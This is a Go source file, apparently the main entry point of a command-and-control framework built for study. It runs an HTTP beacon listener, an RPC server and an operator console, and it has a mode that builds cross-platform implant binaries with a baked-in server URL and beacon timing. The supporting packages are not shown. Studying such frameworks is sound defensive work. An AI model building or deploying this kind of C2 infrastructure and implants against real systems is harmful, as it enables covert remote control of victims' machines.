package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"

	"github.com/gin-gonic/gin"
	"xhc2_for_studying/server/c2"
	serverConfig "xhc2_for_studying/server/config"
	"xhc2_for_studying/server/console"
	"xhc2_for_studying/server/generate"
	rpcserver "xhc2_for_studying/server/rpc"
	"xhc2_for_studying/server/store"
)

func main() {
	defaultAddr := getenv("C2_TO_STUDY_ADDR", ":8024")
	addr := flag.String("addr", defaultAddr, "HTTP C2 listen address")
	rpcAddr := flag.String("rpc-addr", ":8025", "RPC listen address")

	// generate 模式参数
	genOutput := flag.String("output", "implant-main", "implant binary output path")
	genURL := flag.String("server-url", "http://127.0.0.1:8024", "server URL baked into implant")
	genInterval := flag.Int64("interval", 5, "beacon check-in interval (seconds)")
	genJitter := flag.Int64("jitter", 0, "beacon jitter (seconds)")
	genOS := flag.String("os", "linux", "target OS (linux, windows, darwin)")
	genArch := flag.String("arch", "amd64", "target arch (amd64, arm64)")
	genFlag := flag.Bool("generate", false, "generate and build implant binary instead of running server")

	flag.Parse()

	if *genFlag {
		runGenerate(*genOutput, *genURL, *genInterval, *genJitter, *genOS, *genArch)
		return
	}

	runServer(*addr, *rpcAddr)
}

func runServer(addr string, rpcAddr string) {
	// 避免 Gin 日志干扰控制台
	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.Discard

	cfg, err := serverConfig.Load()
	if err != nil {
		log.Fatalf("load server config: %v", err)
	}

	log.Printf("[+] Age public key: %s", cfg.AgePublicKey)

	beaconStore := store.NewBeaconStore()
	taskStore := store.NewServerTaskStore()
	sessionStore := store.NewSessionStore()

	httpServer := c2.NewHTTPServer(beaconStore, taskStore, sessionStore, cfg.AgePrivateKey, cfg.C2Profile)

	// HTTP C2 listener in background
	go func() {
		if err := httpServer.Run(addr); err != nil {
			log.Fatalf("http server: %v", err)
		}
	}()

	// RPC server in background
	go func() {
		svc := &rpcserver.C2RPC{
			BeaconStore:  beaconStore,
			TaskStore:    taskStore,
			SessionStore: sessionStore,
		}
		if err := rpcserver.Serve(rpcAddr, svc); err != nil {
			log.Fatalf("rpc server: %v", err)
		}
	}()

	// Interactive console in foreground
	con := &console.Console{
		BeaconStore:  beaconStore,
		TaskStore:    taskStore,
		SessionStore: sessionStore,
	}
	con.Run()
}

func runGenerate(output, serverURL string, interval, jitter int64, goos, goarch string) {
	cfg, err := serverConfig.Load()
	if err != nil {
		log.Fatalf("load server config: %v", err)
	}

	fmt.Printf("[*] Server public key: %s\n", cfg.AgePublicKey)
	fmt.Printf("[*] Server URL:      %s\n", serverURL)
	fmt.Printf("[*] Target:          %s/%s\n", goos, goarch)
	fmt.Printf("[*] Interval:        %ds, Jitter: %ds\n", interval, jitter)
	fmt.Printf("[*] Building implant from embedded source...\n")

	if err := generate.GenerateAndBuildEmbedded(serverURL, interval, jitter, cfg.AgePublicKey, cfg.C2Profile, output, goos, goarch); err != nil {
		log.Fatalf("generate & build: %v", err)
	}

	fmt.Printf("[+] Implant binary built: %s\n", output)
}

func getenv(key, fallback string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return fallback
}
